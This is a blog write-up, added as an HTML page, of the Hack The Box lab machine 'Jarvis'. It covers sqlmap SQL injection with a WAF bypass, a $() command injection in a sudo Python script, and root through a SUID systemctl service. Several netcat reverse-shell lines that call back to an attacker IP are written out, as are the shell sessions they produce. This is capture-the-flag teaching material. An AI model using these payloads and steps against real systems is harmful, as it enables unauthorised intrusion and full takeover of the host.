@@ -1,0 +1,683 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Jarvis - Hack The Box - hackcommander.io</title>
+<meta name="description" content="The entrypoint for Jarvis is an SQL injection vulnerability in the web application to book hotel rooms. There is a WAF but I was able to easily get around it by lowering the amount of requests per second in sqlmap and changing the user-agent header. After landing a shell, I exploit a simple command injection to get access to another user then I use systemctl which has been set SUID root to create a new service and get root RCE.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Jarvis - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-jarvis/">
+
+
+  <meta property="og:description" content="The entrypoint for Jarvis is an SQL injection vulnerability in the web application to book hotel rooms. There is a WAF but I was able to easily get around it by lowering the amount of requests per second in sqlmap and changing the user-agent header. After landing a shell, I exploit a simple command injection to get access to another user then I use systemctl which has been set SUID root to create a new service and get root RCE.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-jarvis/jarvis_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-11-09T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-jarvis/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Jarvis - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Jarvis - Hack The Box">
+    <meta itemprop="description" content="The entrypoint for Jarvis is an SQL injection vulnerability in the web application to book hotel rooms. There is a WAF but I was able to easily get around it by lowering the amount of requests per second in sqlmap and changing the user-agent header. After landing a shell, I exploit a simple command injection to get access to another user then I use systemctl which has been set SUID root to create a new service and get root RCE.">
+    <meta itemprop="datePublished" content="November 09, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Jarvis - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-11-09T00:00:00+01:00">November 09, 2019 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-jarvis/jarvis_logo.png" alt=""></p>
+
+<p>The entrypoint for Jarvis is an SQL injection vulnerability in the web application to book hotel rooms. There is a WAF but I was able to easily get around it by lowering the amount of requests per second in sqlmap and changing the user-agent header. After landing a shell, I exploit a simple command injection to get access to another user then I use systemctl which has been set SUID root to create a new service and get root RCE.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>There’s a SQL injection vulnerability in the <code class="language-plaintext highlighter-rouge">room.php</code> code that can be used to dump the database and get RCE</li>
+  <li>We can escalate from <code class="language-plaintext highlighter-rouge">www-data</code> to <code class="language-plaintext highlighter-rouge">pepper</code> user by command injection in the <code class="language-plaintext highlighter-rouge">simpler.py</code> script</li>
+  <li>For privesc, the <code class="language-plaintext highlighter-rouge">systemctl</code> has been made SUID so we can just register a new service that spawns a reverse shell as root</li>
+</ul>
+
+<h3 id="portscan">Portscan</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.143
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-23 13:21 EDT
+Nmap scan report for jarvis.htb (10.10.10.143)
+Host is up (0.024s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
+|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
+|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Stark Hotel
+64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h3 id="web-enumeration-on-port-64999">Web enumeration on port 64999</h3>
+
+<p>The page on port 64999 displays a banned error message. This page is used whenever the protection mecanism is triggered on the box. Traffic to port 80 is redirected to port 64999 using iptables whenever an SQL injection is detected.</p>
+
+<p><img src="/assets/images/htb-writeup-jarvis/3.png" alt=""></p>
+
+<h3 id="web-enumeration-on-port-80">Web enumeration on port 80</h3>
+
+<p>On port 80 we have the webpage of Stark Hotel.</p>
+
+<p><img src="/assets/images/htb-writeup-jarvis/1.png" alt=""></p>
+
+<p>There’s a link that display the various rooms.</p>
+
+<p><img src="/assets/images/htb-writeup-jarvis/2.png" alt=""></p>
+
+<p>I spidered the website with Burp and found a couple of PHP files.</p>
+
+<p><img src="/assets/images/htb-writeup-jarvis/4.png" alt=""></p>
+
+<p>To book a room, the <code class="language-plaintext highlighter-rouge">room.php</code> file takes the <code class="language-plaintext highlighter-rouge">cod</code> parameter. The room ID is probably stored in a database so this is target for a potential SQL injection.</p>
+
+<h3 id="sql-injection">SQL injection</h3>
+
+<p>I used sqlmap to scan for SQL injection points:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod</code></p>
+
+<p><img src="/assets/images/htb-writeup-jarvis/sql1.png" alt=""></p>
+
+<p>I started getting 404 errors and got the <code class="language-plaintext highlighter-rouge">Hey you have been banned for 90 seconds, don't be bad</code> message when I tried browsing the site. There’s some kind of WAF on the site that triggers when it’s being scanned for SQL injections.</p>
+
+<p>There’s an HTTP header in the response that confirms this:</p>
+
+<p><img src="/assets/images/htb-writeup-jarvis/waf.png" alt=""></p>
+
+<p>To bypass the WAF, I changed the User-Agent header to a random header and added a delay when scanning with SQLmap:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod --delay 2 --random-agent</code></p>
+
+<p><img src="/assets/images/htb-writeup-jarvis/sql2.png" alt=""></p>
+
+<p>sqlmap found 3 type of SQL injections</p>
+
+<ul>
+  <li>boolean-based blind</li>
+  <li>time-based blind</li>
+  <li>UNION query</li>
+</ul>
+
+<p>By default, sqlmap will use the union query since it’s much faster than the other two.</p>
+
+<p>We easily get a shell using the <code class="language-plaintext highlighter-rouge">--os-pwn</code> option in sqlmap:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod --delay 2 --random-agent --os-pwn</code></p>
+
+<p><img src="/assets/images/htb-writeup-jarvis/met1.png" alt=""></p>
+
+<p><img src="/assets/images/htb-writeup-jarvis/met2.png" alt=""></p>
+
+<p><img src="/assets/images/htb-writeup-jarvis/met3.png" alt=""></p>
+
+<h3 id="escalating-to-user-pepper">Escalating to user pepper</h3>
+
+<p><code class="language-plaintext highlighter-rouge">/var/www/Admin-Utilities</code> contains a <code class="language-plaintext highlighter-rouge">simpler.py</code> script that can be executed as user <code class="language-plaintext highlighter-rouge">pepper</code> through sudo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@jarvis:~/Admin-Utilities$ sudo -l
+Matching Defaults entries for www-data on jarvis:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jarvis:
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+</code></pre></div></div>
+
+<p>The ping function contains a command injection vulnerability. Because it uses the <code class="language-plaintext highlighter-rouge">os.system</code> function to execute the ping, we can pass additional parameters to execute commands.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exec_ping</span><span class="p">():</span>
+    <span class="n">forbidden</span> <span class="o">=</span> <span class="p">[</span><span class="s">'&amp;'</span><span class="p">,</span> <span class="s">';'</span><span class="p">,</span> <span class="s">'-'</span><span class="p">,</span> <span class="s">'`'</span><span class="p">,</span> <span class="s">'||'</span><span class="p">,</span> <span class="s">'|'</span><span class="p">]</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'Enter an IP: '</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">forbidden</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">'Got you'</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">()</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'ping '</span> <span class="o">+</span> <span class="n">command</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>There’s a list of forbidden commands so we can’t simply use the semi-colon or ampersand characters to inject commands but the <code class="language-plaintext highlighter-rouge">$()</code> characters are not filtered.</p>
+
+<p>I’ve created a small script that’s execute a netcat reverse shell into <code class="language-plaintext highlighter-rouge">/dev/shm/shell.sh</code>:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+nc <span class="nt">-e</span> /bin/bash 10.10.14.5 5555
+</code></pre></div></div>
+
+<p>I can execute the script by injecting the following payload in <code class="language-plaintext highlighter-rouge">simpler.py</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@jarvis:~$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+
+Enter an IP: $(/dev/shm/shell.sh)
+$(/dev/shm/shell.sh)
+</code></pre></div></div>
+
+<p>I now have a shell as <code class="language-plaintext highlighter-rouge">pepper</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 5555
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::5555
+Ncat: Listening on 0.0.0.0:5555
+Ncat: Connection from 10.10.10.143.
+Ncat: Connection from 10.10.10.143:38924.
+id
+uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
+python -c 'import pty;pty.spawn("/bin/bash")'
+pepper@jarvis:/var/www$ cd
+cd
+pepper@jarvis:~$ ls
+ls
+Web  user.txt
+pepper@jarvis:~$ cat user.txt
+2afa36c...
+</code></pre></div></div>
+
+<h3 id="privesc">Privesc</h3>
+
+<p>Looking at SUID binaries, the <code class="language-plaintext highlighter-rouge">systemctl</code> program stands out since it’s not normally SUID:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:~$ find / -perm /4000 2&gt;/dev/null
+[...]
+/bin/systemctl
+[...]
+</code></pre></div></div>
+
+<p>The group has been changed to <code class="language-plaintext highlighter-rouge">pepper</code> so this is likely our next target:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:~$ ls -l /bin/systemctl
+-rwsr-x--- 1 root pepper 174520 Feb 17 03:22 /bin/systemctl
+</code></pre></div></div>
+
+<p>Because we can run <code class="language-plaintext highlighter-rouge">systemctl</code> as root, we can register new services that get executed as whatever user we want. Getting root access is simple since all we need to do is register a new service that’s spawn another reverse shell. I’ll just create <code class="language-plaintext highlighter-rouge">/dev/shm/pwn.service</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Unit]
+Description=Pwn service
+
+[Service]
+ExecStart=/bin/nc -e /bin/bash 10.10.14.5 7777
+
+[Install]
+WantedBy=multi-user.target
+</code></pre></div></div>
+
+<p>Then register the new service and start it:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:/dev/shm$ systemctl enable /dev/shm/pwn.service
+Created symlink /etc/systemd/system/multi-user.target.wants/pwn.service -&gt; /dev/shm/pwn.service.
+Created symlink /etc/systemd/system/pwn.service -&gt; /dev/shm/pwn.service.
+pepper@jarvis:/dev/shm$ systemctl start pwn
+</code></pre></div></div>
+
+<p>We then get a reverse shell as root:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 7777
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::7777
+Ncat: Listening on 0.0.0.0:7777
+Ncat: Connection from 10.10.10.143.
+Ncat: Connection from 10.10.10.143:48144.
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/root.txt
+d41d8cd...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#command-injection" class="page__taxonomy-item" rel="tag">command injection</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqlmap" class="page__taxonomy-item" rel="tag">sqlmap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#suid" class="page__taxonomy-item" rel="tag">suid</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#systemd" class="page__taxonomy-item" rel="tag">systemd</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#waf" class="page__taxonomy-item" rel="tag">waf</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-11-09T00:00:00+01:00">November 09, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-haystack/" class="pagination--pager" title="Haystack - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-networked/" class="pagination--pager" title="Networked - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
